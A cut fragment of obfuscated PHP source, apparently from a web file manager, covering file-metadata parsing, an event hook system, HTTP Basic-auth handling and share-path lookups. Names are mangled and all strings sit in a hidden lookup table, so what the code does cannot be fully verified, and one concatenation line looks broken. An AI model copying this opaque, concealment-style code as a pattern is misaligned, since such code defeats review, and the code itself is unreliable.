(!$FﬁçΩ√ÍˆÇ) { require SDK_DIR . $E…´⁄ºá‘Ÿ[1518]; $FﬁçΩ√ÍˆÇ = new getID3(); } goto f·ÍÁ≠¶á«; A‘Üò…øìß: } public static function support($A†™ŒÃëöœ) { goto aÑ°‹‘ÍÀ§; aÑ°‹‘ÍÀ§: $D‡Öü€é‘ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $A†™ŒÃëöœ = strtolower($A†™ŒÃëöœ); goto e‰»◊ò⁄‡‡; bÚòâ⁄Ü‰≈: return !1; goto F‰ûàÇ†°∑; e‰»◊ò⁄‡‡: $bŒ∞ÀÇá“º = array($D‡Öü€é‘[1522], $D‡Öü€é‘[1520]); if (in_array($A†™ŒÃëöœ, $bŒ∞ÀÇá“º)) { return !0; } if (isset(self::$fileTypeArray[$D‡Öü€é‘[1523]][$A†™ŒÃëöœ])) { return !0; } goto bÚòâ⁄Ü‰≈; F‰ûàÇ†°∑: } private static function parseData($aÖ˘ﬂÎºËÜ, $CáËêì£Ç∏, $Dù¥±ÇÛÂµ) { $a∆ï©Ö‹ÆÒ =& $_SERVER[£¿ÌÙëü¡¯¯]; $CËÆ€®„é≤ = $aÖ˘ﬂÎºËÜ[$a∆ï©Ö‹ÆÒ[1526]]; $bãÃÊÆí©° = array(); foreach ($CáËêì£Ç∏ as $e´úìòËÖ => $dÊä∑∂èÛ ) { foreach ($dÊä∑∂èÛ  as $e™Ùòå¶Ø€) { if (is_array($e™Ùòå¶Ø€)) { $fä≈Ωâ©°ª = self::parseData($aÖ˘ﬂÎºËÜ, $dÊä∑∂èÛ , $Dù¥±ÇÛÂµ); if ($fä≈Ωâ©°ª) { $bãÃÊÆí©°[$e´úìòËÖ] = $fä≈Ωâ©°ª; } break; } $A¿Ö·à¿ˆè = str_replace($a∆ï©Ö‹ÆÒ[1304], $CËÆ€®„é≤, $e™Ùòå¶Ø€); $fä≈Ωâ©°ª = _get($aÖ˘ﬂÎºËÜ, $A¿Ö·à¿ˆè); $fä≈Ωâ©°ª = is_array($fä≈Ωâ©°ª) ? $fä≈Ωâ©°ª[0] : $fä≈Ωâ©°ª; if ($fä≈Ωâ©°ª) { break; } } if ($fä≈Ωâ©°ª || $fä≈Ωâ©°ª === 0 || $fä≈Ωâ©°ª === !1) { $fä≈Ωâ©°ª = self::valueReset($e™Ùòå¶Ø€, $fä≈Ωâ©°ª, $e´úìòËÖ); if ($fä≈Ωâ©°ª !== null) { $bãÃÊÆí©°[$e´úìòËÖ] = $fä≈Ωâ©°ª; } } } $bãÃÊÆí©° = self::valueResetAll($bãÃÊÆí©°, $Dù¥±ÇÛÂµ); return $bãÃÊÆí©°; } private static function psdParse($C»∂¶Ñ ⁄”) { $a¢€Ò ÷’√ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (IO::fileSubstr($C»∂¶Ñ ⁄”, 0, 4) != $a¢€Ò ÷’√[1527]) { return !1; } $eŒ™Àé£Á¯ = getImageSize($C»∂¶Ñ ⁄”, $D¨´˘ É±ª); if (!$eŒ™Àé£Á¯) { return; } $fƒ≠……ä’Ø = array($a¢€Ò ÷’√[1443] => $eŒ™Àé£Á¯[0], $a¢€Ò ÷’√[1445] => $eŒ™Àé£Á¯[1]); return $fƒ≠……ä’Ø; } private static function pdfParse($C±‚«∞ÍÑó) { return FileParsePdf::parse($C±‚«∞ÍÑó); } private static function fileTypeParse() { $bÈ·…óü≈ö =& $_SERVER[£¿ÌÙëü¡¯¯]; $A‹‚ê°”¡ì = self::fileTypeArray(); $E≠∏—óç÷˘ = array(); foreach ($A‹‚ê°”¡ì as $FÙÆäÃ¯≤¨ => $AÜÆ‡ﬂπ∆Ê) { $EÒ‰¡ïòá› = _get($AÜÆ‡ﬂπ∆Ê, $bÈ·…óü≈ö[157], $bÈ·…óü≈ö[33]); $a∏®¥É¢®ñ = is_string($EÒ‰¡ïòá›) ? explode($bÈ·…óü≈ö[47], $EÒ‰¡ïòá›) : $EÒ‰¡ïòá›; if (!$a∏®¥É¢®ñ) { continue; } foreach ($a∏®¥É¢®ñ as $EÒ‰¡ïòá›) { $EÒ‰¡ïòá› = strtolower(trim($EÒ‰¡ïòá›)); if (!$EÒ‰¡ïòá›) { continue; } $E≠∏—óç÷˘[$EÒ‰¡ïòá›] = $FÙÆäÃ¯≤¨; } $A‹‚ê°”¡ì[$FÙÆäÃ¯≤¨][$bÈ·…óü≈ö[157]] = array_keys($E≠∏—óç÷˘); $A‹‚ê°”¡ì[$FÙÆäÃ¯≤¨][$bÈ·…óü≈ö[1525]] = self::parseKeyMap($AÜÆ‡ﬂπ∆Ê[$bÈ·…óü≈ö[1525]]); } return array($bÈ·…óü≈ö[1524] => $A‹‚ê°”¡ì, $bÈ·…óü≈ö[1523] => $E≠∏—óç÷˘); } private static function parseKeyMap($fß√±“Â©…) { $F©“¢Êâ°ú =& $_SERVER[£¿ÌÙëü¡¯¯]; foreach ($fß√±“Â©… as $bõ£∂ì≤œ≥ => $bÇØâÏ›íÆ) { if (is_array($bÇØâÏ›íÆ)) { $Eƒ√ Çà÷œ = self::parseKeyMap($bÇØâÏ›íÆ); if ($Eƒ√ Çà÷œ) { $fß√±“Â©…[$bõ£∂ì≤œ≥] = $Eƒ√ Çà÷œ; } continue; } $d÷Ñ€˜≈´ = explode($F©“¢Êâ°ú[47], $bÇØâÏ›íÆ); $Dº¶¥Âå—Ì = array(); foreach ($d÷Ñ€˜≈´ as $D˜·Œ„∏∆ú) { $D˜·Œ„∏∆ú = trim($D˜·Œ„∏∆ú); if (!$D˜·Œ„∏∆ú) { continue; } if (preg_match($F©“¢Êâ°ú[1528], $D˜·Œ„∏∆ú, $a´áè§åã˘)) { $FØê›æÿÇ⁄ = explode($F©“¢Êâ°ú[268], $a´áè§åã˘[1]); foreach ($FØê›æÿÇ⁄ as $E“ÎçÈÉ¬ä) { $Dº¶¥Âå—Ì[] = str_replace($a´áè§åã˘[0], $E“ÎçÈÉ¬ä, $D˜·Œ„∏∆ú); } } else { $Dº¶¥Âå—Ì[] = $D˜·Œ„∏∆ú; } } $fß√±“Â©…[$bõ£∂ì≤œ≥] = $Dº¶¥Âå—Ì; } return $fß√±“Â©…; } private static function valueResetAll($C‚‹¨â·ºÏ, $DÂâﬁâíóä) { goto d˘é÷ú ƒæ; DΩÈÒﬁÏÑó: return $C‚‹¨â·ºÏ; goto DáÑµªö∫ñ; cåΩÛ•˜˘Ç: $fÛŒÔì⁄–÷ = _get($C‚‹¨â·ºÏ, $f⁄îÈö√Éù[1541], $f⁄îÈö√Éù[33]); $c˜ú‘è‘™Œ = $aƒøäñ’ÙÜ . $bﬂØÿË‚¢Ø . $fÛŒÔì⁄–÷; if ($c˜ú‘è‘™Œ && get_charset($c˜ú‘è‘™Œ) != $f⁄îÈö√Éù[323]) { $C‚‹¨â·ºÏ[$f⁄îÈö√Éù[1538]][$f⁄îÈö√Éù[1248]] = iconv_to($C‚‹¨â·ºÏ[$f⁄îÈö√Éù[1538]][$f⁄îÈö√Éù[1248]], get_charset($c˜ú‘è‘™Œ), $f⁄îÈö√Éù[323]); $C‚‹¨â·ºÏ[$f⁄îÈö√Éù[1538]][$f⁄îÈö√Éù[1542]] = iconv_to($C‚‹¨â·ºÏ[$f⁄îÈö√Éù[1538]][$f⁄îÈö√Éù[1542]], get_charset($c˜ú‘è‘™Œ), $f⁄îÈö√Éù[323]); $C‚‹¨â·ºÏ[$f⁄îÈö√Éù[1538]][$f⁄îÈö√Éù[1543]] = iconv_to($C‚‹¨â·ºÏ[$f⁄îÈö√Éù[1538]][$f⁄îÈö√Éù[1543]], get_charset($c˜ú‘è‘™Œ), $f⁄îÈö√Éù[323]); } goto DΩÈÒﬁÏÑó; fà‡Çìπñê: if ($A°åíê·†ø) { $D≤∫âÀﬂßÔ = IO_PATH_SYSTEM_TEMP . $f⁄îÈö√Éù[1534] . KodIO::hashPath($DÂâﬁâíóä) . $f⁄îÈö√Éù[1535]; $C‚‹¨â·ºÏ[$f⁄îÈö√Éù[1536]] = Action($f⁄îÈö√Éù[1537])->pluginCacheFileSet($D≤∫âÀﬂßÔ, $A°åíê·†ø); unset($C‚‹¨â·ºÏ[$f⁄îÈö√Éù[1538]][$f⁄îÈö√Éù[1521]]); } $aƒøäñ’ÙÜ = _get($C‚‹¨â·ºÏ, $f⁄îÈö√Éù[1539], $f⁄îÈö√Éù[33]); $bﬂØÿË‚¢Ø = _get($C‚‹¨â·ºÏ, $f⁄îÈö√Éù[1540], $f⁄îÈö√Éù[33]); goto cåΩÛ•˜˘Ç; d˘é÷ú ƒæ: $f⁄îÈö√Éù =& $_SERVER[£¿ÌÙëü¡¯¯]; if (isset($C‚‹¨â·ºÏ[$f⁄îÈö√Éù[1529]])) { $dÜ∫ÖÜ∏´Ò = ceil($C‚‹¨â·ºÏ[$f⁄îÈö√Éù[1529]]); $Cê·Ü◊…Æê = intval($dÜ∫ÖÜ∏´Ò / 3600); $BªŸÓÒ‚ö» = intval(($dÜ∫ÖÜ∏´Ò - $Cê·Ü◊…Æê * 3600) / 60); $A›ïôÖ„ÀÀ = $dÜ∫ÖÜ∏´Ò % 60; $C‚‹¨â·ºÏ[$f⁄îÈö√Éù[1530]] = sprintf($f⁄îÈö√Éù[1531], $Cê·Ü◊…Æê, $BªŸÓÒ‚ö», $A›ïôÖ„ÀÀ); if ($Cê·Ü◊…Æê == 0) { $C‚‹¨â·ºÏ[$f⁄îÈö√Éù[1530]] = sprintf($f⁄îÈö√Éù[1532], $BªŸÓÒ‚ö», $A›ïôÖ„ÀÀ); } } $A°åíê·†ø = _get($C‚‹¨â·ºÏ, $f⁄îÈö√Éù[1533]); goto fà‡Çìπñê; DáÑµªö∫ñ: } private static function valueReset($a¬ﬂéŒûÙà, $D≥ñË∑ãÔ∫, $EÌíõìùŸè) { $A∫¡€«∫ÃÎ =& $_SERVER[£¿ÌÙëü¡¯¯]; $CååπÇı § = $A∫¡€«∫ÃÎ[1460]; switch ($a¬ﬂéŒûÙà) { case $A∫¡€«∫ÃÎ[1544]: $D≥ñË∑ãÔ∫ = $D≥ñË∑ãÔ∫ == $A∫¡€«∫ÃÎ[84] ? $A∫¡€«∫ÃÎ[1545] : $A∫¡€«∫ÃÎ[1546]; break; case $A∫¡€«∫ÃÎ[1547]: $D≥ñË∑ãÔ∫ = $D≥ñË∑ãÔ∫ ? $D≥ñË∑ãÔ∫ : null; break; default: break; } switch ($EÌíõìùŸè) { case $A∫¡€«∫ÃÎ[1548]: $D≥ñË∑ãÔ∫ = round($D≥ñË∑ãÔ∫, 2); break; case $A∫¡€«∫ÃÎ[184]: case $A∫¡€«∫ÃÎ[108]: if ($D≥ñË∑ãÔ∫ < 0) { $D≥ñË∑ãÔ∫ = null; } else { if (is_numeric($D≥ñË∑ãÔ∫)) { $D≥ñË∑ãÔ∫ = date($CååπÇı §, $D≥ñË∑ãÔ∫); } } break; default: break; } return $D≥ñË∑ãÔ∫; } private static function fileTypeArray() { $bŸÇ˘—•ÿÁ =& $_SERVER[£¿ÌÙëü¡¯¯]; return array($bŸÇ˘—•ÿÁ[1521] => array($bŸÇ˘—•ÿÁ[157] => $bŸÇ˘—•ÿÁ[1549] . $bŸÇ˘—•ÿÁ[1550], $bŸÇ˘—•ÿÁ[1525] => array($bŸÇ˘—•ÿÁ[1443] => $bŸÇ˘—•ÿÁ[1551], $bŸÇ˘—•ÿÁ[1445] => $bŸÇ˘—•ÿÁ[1552], $bŸÇ˘—•ÿÁ[1553] => $bŸÇ˘—•ÿÁ[1554], $bŸÇ˘—•ÿÁ[1555] => $bŸÇ˘—•ÿÁ[1556], $bŸÇ˘—•ÿÁ[184] => $bŸÇ˘—•ÿÁ[1557], $bŸÇ˘—•ÿÁ[108] => $bŸÇ˘—•ÿÁ[1558], $bŸÇ˘—•ÿÁ[1559] => $bŸÇ˘—•ÿÁ[1560], $bŸÇ˘—•ÿÁ[1561] => $bŸÇ˘—•ÿÁ[1562], $bŸÇ˘—•ÿÁ[1563] => $bŸÇ˘—•ÿÁ[1564], $bŸÇ˘—•ÿÁ[1565] => $bŸÇ˘—•ÿÁ[1566], $bŸÇ˘—•ÿÁ[1567] => $bŸÇ˘—•ÿÁ[1568], $bŸÇ˘—•ÿÁ[1569] => $bŸÇ˘—•ÿÁ[1570], $bŸÇ˘—•ÿÁ[1571] => $bŸÇ˘—•ÿÁ[1572], $bŸÇ˘—•ÿÁ[1573] => array($bŸÇ˘—•ÿÁ[1574] => $bŸÇ˘—•ÿÁ[1575], $bŸÇ˘—•ÿÁ[1576] => $bŸÇ˘—•ÿÁ[1577], $bŸÇ˘—•ÿÁ[1578] => $bŸÇ˘—•ÿÁ[1579]), $bŸÇ˘—•ÿÁ[1580] => $bŸÇ˘—•ÿÁ[1581], $bŸÇ˘—•ÿÁ[1582] => $bŸÇ˘—•ÿÁ[1583], $bŸÇ˘—•ÿÁ[1584] => $bŸÇ˘—•ÿÁ[1585], $bŸÇ˘—•ÿÁ[1586] => $bŸÇ˘—•ÿÁ[1587], $bŸÇ˘—•ÿÁ[1588] => array($bŸÇ˘—•ÿÁ[1589] => $bŸÇ˘—•ÿÁ[1590], $bŸÇ˘—•ÿÁ[1591] => $bŸÇ˘—•ÿÁ[1592], $bŸÇ˘—•ÿÁ[1593] => $bŸÇ˘—•ÿÁ[1594], $bŸÇ˘—•ÿÁ[1595] => $bŸÇ˘—•ÿÁ[1596], $bŸÇ˘—•ÿÁ[1597] => $bŸÇ˘—•ÿÁ[1598], $bŸÇ˘—•ÿÁ[1599] => $bŸÇ˘—•ÿÁ[1600], $bŸÇ˘—•ÿÁ[1601] => $bŸÇ˘—•ÿÁ[1602], $bŸÇ˘—•ÿÁ[1603] => $bŸÇ˘—•ÿÁ[1604], $bŸÇ˘—•ÿÁ[1605] => $bŸÇ˘—•ÿÁ[1606], $bŸÇ˘—•ÿÁ[1607] => $bŸÇ˘—•ÿÁ[1608], $bŸÇ˘—•ÿÁ[1609] => $bŸÇ˘—•ÿÁ[1610]))), $bŸÇ˘—•ÿÁ[1611] => array($bŸÇ˘—•ÿÁ[157] => $bŸÇ˘—•ÿÁ[1612] . $bŸÇ˘—•ÿÁ[1613], $bŸÇ˘—•ÿÁ[1525] => array($bŸÇ˘—•ÿÁ[1529] => $bŸÇ˘—•ÿÁ[1614], $bŸÇ˘—•ÿÁ[184] => $bŸÇ˘—•ÿÁ[1615], $bŸÇ˘—•ÿÁ[108] => $bŸÇ˘—•ÿÁ[1616], $bŸÇ˘—•ÿÁ[1561] => $bŸÇ˘—•ÿÁ[1617], $bŸÇ˘—•ÿÁ[1618] => $bŸÇ˘—•ÿÁ[1619], $bŸÇ˘—•ÿÁ[1620] => $bŸÇ˘—•ÿÁ[1547], $bŸÇ˘—•ÿÁ[1621] => $bŸÇ˘—•ÿÁ[1622], $bŸÇ˘—•ÿÁ[1623] => $bŸÇ˘—•ÿÁ[1624], $bŸÇ˘—•ÿÁ[1625] => $bŸÇ˘—•ÿÁ[1626], $bŸÇ˘—•ÿÁ[1538] => array($bŸÇ˘—•ÿÁ[1248] => $bŸÇ˘—•ÿÁ[1627], $bŸÇ˘—•ÿÁ[1542] => $bŸÇ˘—•ÿÁ[1628], $bŸÇ˘—•ÿÁ[1543] => $bŸÇ˘—•ÿÁ[1629], $bŸÇ˘—•ÿÁ[1630] => $bŸÇ˘—•ÿÁ[1631], $bŸÇ˘—•ÿÁ[1632] => $bŸÇ˘—•ÿÁ[1633], $bŸÇ˘—•ÿÁ[1634] => $bŸÇ˘—•ÿÁ[1635], $bŸÇ˘—•ÿÁ[1521] => $bŸÇ˘—•ÿÁ[1636]))), $bŸÇ˘—•ÿÁ[1637] => array($bŸÇ˘—•ÿÁ[157] => $bŸÇ˘—•ÿÁ[1638] . $bŸÇ˘—•ÿÁ[1639], $bŸÇ˘—•ÿÁ[1525] => array($bŸÇ˘—•ÿÁ[1443] => $bŸÇ˘—•ÿÁ[1640], $bŸÇ˘—•ÿÁ[1445] => $bŸÇ˘—•ÿÁ[1641], $bŸÇ˘—•ÿÁ[1529] => $bŸÇ˘—•ÿÁ[1614], $bŸÇ˘—•ÿÁ[184] => $bŸÇ˘—•ÿÁ[1642], $bŸÇ˘—•ÿÁ[108] => $bŸÇ˘—•ÿÁ[1643], $bŸÇ˘—•ÿÁ[1548] => $bŸÇ˘—•ÿÁ[1644], $bŸÇ˘—•ÿÁ[1625] => $bŸÇ˘—•ÿÁ[1645], $bŸÇ˘—•ÿÁ[1621] => $bŸÇ˘—•ÿÁ[1646], $bŸÇ˘—•ÿÁ[1561] => $bŸÇ˘—•ÿÁ[1647], $bŸÇ˘—•ÿÁ[1611] => array($bŸÇ˘—•ÿÁ[1620] => $bŸÇ˘—•ÿÁ[1547], $bŸÇ˘—•ÿÁ[1648] => $bŸÇ˘—•ÿÁ[1649], $bŸÇ˘—•ÿÁ[1618] => $bŸÇ˘—•ÿÁ[1619], $bŸÇ˘—•ÿÁ[1625] => $bŸÇ˘—•ÿÁ[1626], $bŸÇ˘—•ÿÁ[1621] => $bŸÇ˘—•ÿÁ[1650], $bŸÇ˘—•ÿÁ[1623] => $bŸÇ˘—•ÿÁ[1624]))), $bŸÇ˘—•ÿÁ[1651] => array($bŸÇ˘—•ÿÁ[1525] => array($bŸÇ˘—•ÿÁ[1652] => $bŸÇ˘—•ÿÁ[1653], $bŸÇ˘—•ÿÁ[1654] => $bŸÇ˘—•ÿÁ[1655])), $bŸÇ˘—•ÿÁ[1656] => array($bŸÇ˘—•ÿÁ[1525] => array())); } } class Hook { private static $events = array(); public static function get($DÉ¢õÑÒÆ´ = false) { if (!$DÉ¢õÑÒÆ´) { return self::$events; } else { return self::$events[$DÉ¢õÑÒÆ´]; } } public static function apply($dãˆìàÑÃ, $FÖãáﬂ£Ñâ = array()) { $AΩ»•‘˜Í¨ = ActionApply($dãˆìàÑÃ, $FÖãáﬂ£Ñâ); if (is_string($dãˆìàÑÃ)) { Hook::trigger($dãˆìàÑÃ); } return $AΩ»•‘˜Í¨; } public static function bind($D¿»´ôÚ‹∞, $fﬁá«ÔÌåê, $Cì⁄∞˜èñÔ = false) { $B°∫€ø¡øá =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!isset(self::$events[$D¿»´ôÚ‹∞])) { self::$events[$D¿»´ôÚ‹∞] = array(); } self::$events[$D¿»´ôÚ‹∞][] = array($B°∫€ø¡øá[1657] => $fﬁá«ÔÌåê, $B°∫€ø¡øá[1658] => $Cì⁄∞˜èñÔ, $B°∫€ø¡øá[1659] => 0); } public static function once($DÛ€øàùáΩ, $e¶ä∫å⁄⁄¡) { self::bind($DÛ€øàùáΩ, $e¶ä∫å⁄⁄¡, !0); } public static function unbind($C¯ÁÉ—ô÷ƒ, $C‰‹£””¯î = false) { if (!$C‰‹£””¯î) { self::$events[$C¯ÁÉ—ô÷ƒ] = array(); return; } $Bÿá‘‡‰˘ÿ = self::$events[$C¯ÁÉ—ô÷ƒ]; self::$events[$C¯ÁÉ—ô÷ƒ] = array(); if (!$Bÿá‘‡‰˘ÿ) { return; } for ($Eóãë›Û›ﬂ = 0; $Eóãë›Û›ﬂ < count($Bÿá‘‡‰˘ÿ); $Eóãë›Û›ﬂ++) { if ($Bÿá‘‡‰˘ÿ[$Eóãë›Û›ﬂ][$_SERVER[£¿ÌÙëü¡¯¯][1657]] == $C‰‹£””¯î) { continue; } self::$events[$C¯ÁÉ—ô÷ƒ][] = $Bÿá‘‡‰˘ÿ[$Eóãë›Û›ﬂ]; } } public static function filter($F¨ÓÁ°ºçﬁ, $D÷ÀÇŸá±Œ) { goto E≠°µœ“Æ…; aÚä∆ï≠äﬁ: for ($eóàµˆÉ¡Œ = 0; $eóàµˆÉ¡Œ < count($f∞ú˜éïÖ≈); $eóàµˆÉ¡Œ++) { $Fè¿ÂÇÜ§∑ = $f∞ú˜éïÖ≈[$eóàµˆÉ¡Œ]; if ($Fè¿ÂÇÜ§∑[$aî£à¥∞ˆª[1658]] && $Fè¿ÂÇÜ§∑[$aî£à¥∞ˆª[1659]] > 1) { continue; } self::$events[$F¨ÓÁ°ºçﬁ][$eóàµˆÉ¡Œ][$aî£à¥∞ˆª[1659]] = $Fè¿ÂÇÜ§∑[$aî£à¥∞ˆª[1659]] + 1; $BØç∫‘—ÿ… = self::apply($Fè¿ÂÇÜ§∑[$aî£à¥∞ˆª[1657]], array($f‘ôÆ–Ñ’ó)); if (!is_null($BØç∫‘—ÿ…)) { $f‘ôÆ–Ñ’ó = $BØç∫‘—ÿ…; } } return $f‘ôÆ–Ñ’ó; goto dÍ˜ñâô’ë; E≠°µœ“Æ…: $aî£à¥∞ˆª =& $_SERVER[£¿ÌÙëü¡¯¯]; $aö∑æ±úß¨ = self::$events; if (!isset($aö∑æ±úß¨[$F¨ÓÁ°ºçﬁ])) { return $D÷ÀÇŸá±Œ; } goto bÍ“àâäÊ…; bÍ“àâäÊ…: $f∞ú˜éïÖ≈ = $aö∑æ±úß¨[$F¨ÓÁ°ºçﬁ]; $f‘ôÆ–Ñ’ó = $D÷ÀÇŸá±Œ; if (!is_array($f∞ú˜éïÖ≈) || count($f∞ú˜éïÖ≈) == 0) { return $f‘ôÆ–Ñ’ó; } goto aÚä∆ï≠äﬁ; dÍ˜ñâô’ë: } public static function trigger($aê˘¨∫§Òå) { goto EÂ≤®Ìœøç; b‚Ÿ‡—Üúé: $DôÃ—¶ÂÜ¥ = func_get_args(); array_shift($DôÃ—¶ÂÜ¥); for ($eÿ⁄Ö∏∂ç„ = 0; $eÿ⁄Ö∏∂ç„ < count($c§£â®±¢ä); $eÿ⁄Ö∏∂ç„++) { $e‘¥úíÑ∫¿ = $c§£â®±¢ä[$eÿ⁄Ö∏∂ç„]; if ($e‘¥úíÑ∫¿[$c£Á„–Òºë[1658]] && $e‘¥úíÑ∫¿[$c£Á„–Òºë[1659]] > 1) { continue; } if (defined($c£Á„–Òºë[1660]) && GLOBAL_LOG_HOOK) { write_log($aê˘¨∫§Òå . $c£Á„–Òºë[1661] . $e‘¥úíÑ∫¿[$c£Á„–Òºë[1657]], $c£Á„–Òºë[1662]); } self::$events[$aê˘¨∫§Òå][$eÿ⁄Ö∏∂ç„][$c£Á„–Òºë[1659]] = $e‘¥úíÑ∫¿[$c£Á„–Òºë[1659]] + 1; $DÕ∞ÒÁ˘Æ˜ = self::apply($e‘¥úíÑ∫¿[$c£Á„–Òºë[1657]], $DôÃ—¶ÂÜ¥); if (defined($c£Á„–Òºë[1660]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $c£Á„–Òºë[1662]); if ($e‘¥úíÑ∫¿[$c£Á„–Òºë[1659]] == 200) { $E≥Ùí¶öÛê = is_array($e‘¥úíÑ∫¿[$c£Á„–Òºë[1657]]) ? json_encode_force($e‘¥úíÑ∫¿[$c£Á„–Òºë[1657]]) : $e‘¥úíÑ∫¿[$c£Á„–Òºë[1657]]; write_log($c£Á„–Òºë[1663] . $aê˘¨∫§Òå . $c£Á„–Òºë[1664] . $E≥Ùí¶öÛê, $c£Á„–Òºë[1665]); } } $Eä¡´®Ç≥‚ = is_null($DÕ∞ÒÁ˘Æ˜) ? $Eä¡´®Ç≥‚ : $DÕ∞ÒÁ˘Æ˜; } goto Fﬁ·®ªÔ≥ø; B·§⁄Ï›ãè: if (!isset($dâÛã√‰ûö[$aê˘¨∫§Òå])) { return $Eä¡´®Ç≥‚; } $c§£â®±¢ä = $dâÛã√‰ûö[$aê˘¨∫§Òå]; if (!is_array($c§£â®±¢ä) || count($c§£â®±¢ä) == 0) { return $Eä¡´®Ç≥‚; } goto b‚Ÿ‡—Üúé; EÂ≤®Ìœøç: $c£Á„–Òºë =& $_SERVER[£¿ÌÙëü¡¯¯]; $dâÛã√‰ûö = self::$events; $Eä¡´®Ç≥‚ = !1; goto B·§⁄Ï›ãè; Fﬁ·®ªÔ≥ø: return $Eä¡´®Ç≥‚; goto E∆¥‰¨Ëøß; E∆¥‰¨Ëøß: } } class HttpAuth { public static function get() { $Fî‹àò‹£ô =& $_SERVER[£¿ÌÙëü¡¯¯]; $d„°Ω¬ñ¯È = $Fî‹àò‹£ô[33]; $dª‰π∏¯Êú = $Fî‹àò‹£ô[33]; if (isset($_SERVER[$Fî‹àò‹£ô[1666]])) { $d„°Ω¬ñ¯È = $_SERVER[$Fî‹àò‹£ô[1666]]; $dª‰π∏¯Êú = $_SERVER[$Fî‹àò‹£ô[1667]]; } elseif (isset($_SERVER[$Fî‹àò‹£ô[1668]])) { $D√˘’ê»ü‡ = $_SERVER[$Fî‹àò‹£ô[1668]]; if (strpos(strtolower($D√˘’ê»ü‡), $Fî‹àò‹£ô[1669]) === 0) { $fÇ®é∏Öé∏ = explode($Fî‹àò‹£ô[4], base64_decode(substr($D√˘’ê»ü‡, 6))); $d„°Ω¬ñ¯È = isset($fÇ®é∏Öé∏[0]) ? $fÇ®é∏Öé∏[0] : $Fî‹àò‹£ô[33]; $dª‰π∏¯Êú = isset($fÇ®é∏Öé∏[1]) ? $fÇ®é∏Öé∏[1] : 0; } } return array($Fî‹àò‹£ô[527] => $d„°Ω¬ñ¯È, $Fî‹àò‹£ô[895] => $dª‰π∏¯Êú); } public static function error() { goto dÕèıß„ÈÑ; dÕèıß„ÈÑ: $fç€∆·¡‚õ =& $_SERVER[£¿ÌÙëü¡¯¯]; header($fç€∆·¡‚õ[1670]); header($fç€∆·¡‚õ[1671]); goto f√∫‡ÁÚçﬁ; f√∫‡ÁÚçﬁ: header($fç€∆·¡‚õ[1672]); header($fç€∆·¡‚õ[1673]); header($fç€∆·¡‚õ[1674]); goto báŸ¯≤Èÿ©; báŸ¯≤Èÿ©: die; goto BË°á‚ì“Ç; BË°á‚ì“Ç: } public static function make($Bô¬¨¡üô, $E•ë‚àï©º) { $eº’ﬁ∂ãßµ =& $_SERVER[£¿ÌÙëü¡¯¯]; return $eº’ﬁ∂ãßµ[1675] + base64_encode($Bô¬¨¡üô . $eº’ﬁ∂ãßµ[4] . $E•ë‚àï©º); } } goto eåà£â”à¥; f§·ÒÆ„Ìﬁ: class PathDriverDbShareItem extends PathDriverDB { public function __construct($D™∏ëà”€è) { $this->pathParse = $D™∏ëà”€è; $this->model = Model($_SERVER[£¿ÌÙëü¡¯¯][1084]); } public function getPathOuter($CÒâœ°£È±) { $câ†ÀﬂªÓ» =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$CÒâœ°£È±) { return $CÒâœ°£È±; } $cº≠÷çÚ·· = $this->parse($CÒâœ°£È±); return trim(KodIO::makeShare($this->pathParse[$câ†ÀﬂªÓ»[364]], $cº≠÷çÚ··[$câ†ÀﬂªÓ»[364]]), $câ†ÀﬂªÓ»[8]); } protected function infoParse($e‚‡ˆ√ùÚ˘, $a¶‡ﬂ–Òπ§ = false, $A¢Æ∫◊ùçö = false) { $fæ•âÉÔ”ñ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Fˆ‘ó—Í≥Â = $this->pathParse[$fæ•âÉÔ”ñ[364]]; $DÃ§ﬂﬂÆ»‡ = trim($this->pathParse[$fæ•âÉÔ”ñ[985]], $fæ•âÉÔ”ñ[8]); return Action($fæ•âÉÔ”ñ[1090])->sharePathInfo($Fˆ‘ó—Í≥Â, $DÃ§ﬂﬂÆ»‡); } public function infoFull($aöØç’π‚Ü) { $E§∂ÁÛæ∞ä =& $_SERVER[£¿ÌÙëü¡¯¯]; $CƒŸ—“òÔ“ = explode($E§∂ÁÛæ∞ä[8], trim($aöØç’π‚Ü, $E§∂ÁÛæ∞ä[8])); if (count($CƒŸ—“òÔ“) > 1) { $bÉ†ıÒª¶Ï = implode($E§∂ÁÛæ∞ä[8], array_splice($CƒŸ—“òÔ“, 1)); $aó¯û√’≤À = $this->model->pathInfoByPath($CƒŸ—“òÔ“[0], $bÉ†ıÒª¶Ï); if (!$aó¯û√’≤À) { return !1; } $this->pathParse[$E§∂ÁÛæ∞ä[985]] = $aó¯û√’≤À[$E§∂ÁÛæ∞ä[366]]; } return $this->infoParse($aöØç’π‚Ü); } public function listAll($Dÿ–’‚Ã•Ë) { goto eíÂˆ∞ºáÜ; C∑¿ñ˜ƒ¿: foreach ($bﬂòØØ§‰˜ as &$a†Íª´≥´„) { check_abort(); $a†Íª´≥´„[$DÀ¶ƒ“ê∏ı[388]] = $CÂ‹¿ìæõ≠->_shareItemeParse($a†Íª´≥´„[$DÀ¶ƒ“ê∏ı[388]], $cëÂ‰‘äÀ¢); } return $bﬂòØØ§‰˜; goto dÜ≥◊œ«Üÿ; eˆäÏπ‹í‘: $bﬂòØØ§‰˜ = $this->model->listAll($Dÿ–’‚Ã•Ë); $cëÂ‰‘äÀ¢ = Model($DÀ¶ƒ“ê∏ı[528])->getInfo($cÈ‰äˆŸ•è[$DÀ¶ƒ“ê∏ı[437]]); $CÂ‹¿ìæõ≠ = Action($DÀ¶ƒ“ê∏ı[1090]); goto C∑¿ñ˜ƒ¿; eíÂˆ∞ºáÜ: $DÀ¶ƒ“ê∏ı =& $_SERVER[£¿ÌÙëü¡¯¯]; $cÈ‰äˆŸ•è = IO::info($this->pathParse[$DÀ¶ƒ“ê∏ı[76]]); if (!$cÈ‰äˆŸ•è) { return array(); } goto eˆäÏπ‹í‘; dÜ≥◊œ«Üÿ: } } $eÓâÈ≤ˆàﬂ = LIB_DIR . $_SERVER[£¿ÌÙëü¡¯¯][1091]; $D‹ÀÃπ˘‚Ï = $_SERVER[£¿ÌÙëü¡¯¯][784]; goto FÖØ€˜äëô; cü„◊¥‰éç: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\x69\x6e\153\137"; protected $pconnect = false; protected $queryStr = 